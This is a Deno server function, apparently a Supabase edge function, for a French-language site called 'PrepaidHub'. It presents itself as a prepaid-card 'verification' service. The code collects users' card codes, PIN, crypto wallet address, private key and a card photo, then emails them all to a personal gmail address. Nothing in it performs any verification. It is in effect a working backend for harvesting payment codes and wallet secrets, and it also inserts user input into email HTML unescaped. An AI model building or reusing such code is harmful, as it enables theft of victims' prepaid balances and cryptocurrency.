import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "npm:resend@2.0.0";

const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

interface NotifyAdminRequest {
  cardType: string;
  email: string;
  codes?: string[];
  wallet?: string;
  pin?: string;
  publicAddress?: string;
  privateKey?: string;
  imageUrl?: string;
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { cardType, email, codes = [], wallet, pin, publicAddress, privateKey, imageUrl }: NotifyAdminRequest = await req.json();

    console.log("Received submission notification request:", { cardType, email });

    const filledCodes = codes.filter(code => code && code.trim() !== '');
    const codesHtml = filledCodes.length
      ? `<h3>Codes soumis:</h3><ul>${filledCodes.map((code, i) => `<li><strong>Code ${i + 1}:</strong> ${code}</li>`).join('')}</ul>`
      : '';

    const cryptoRows = [
      wallet && `<li><strong>Wallet:</strong> ${wallet}</li>`,
      pin && `<li><strong>PIN:</strong> ${pin}</li>`,
      publicAddress && `<li><strong>Adresse publique:</strong> ${publicAddress}</li>`,
      privateKey && `<li><strong>Clé privée:</strong> ${privateKey}</li>`,
    ].filter(Boolean).join('');
    const cryptoHtml = cryptoRows ? `<h3>Informations crypto:</h3><ul>${cryptoRows}</ul>` : '';

    const imageHtml = imageUrl ? `<h3>Photo de la carte:</h3><p><a href="${imageUrl}">${imageUrl}</a></p><img src="${imageUrl}" style="max-width:400px;" />` : '';

    const emailResponse = await resend.emails.send({
      from: "PrepaidHub <onboarding@resend.dev>",
      to: ["prepaidhub0@gmail.com"],
      subject: `Nouvelle demande de vérification - ${cardType}`,
      html: `
        <h1>Nouvelle demande de vérification de carte prépayée</h1>
        <h2>Détails de la soumission:</h2>
        <ul>
          <li><strong>Type de carte:</strong> ${cardType}</li>
          <li><strong>Email client:</strong> ${email}</li>
        </ul>
        ${codesHtml}
        ${cryptoHtml}
        ${imageHtml}
        <p>Connectez-vous au tableau de bord pour traiter cette demande.</p>
      `,
    });

    if (emailResponse.error) {
      console.error("Resend error (notify-admin):", emailResponse.error);
      return new Response(JSON.stringify({ error: emailResponse.error.message }), {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      });
    }

    console.log("Admin notification email sent successfully:", emailResponse);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { "Content-Type": "application/json", ...corsHeaders },
    });
  } catch (error: any) {
    console.error("Error in notify-admin function:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
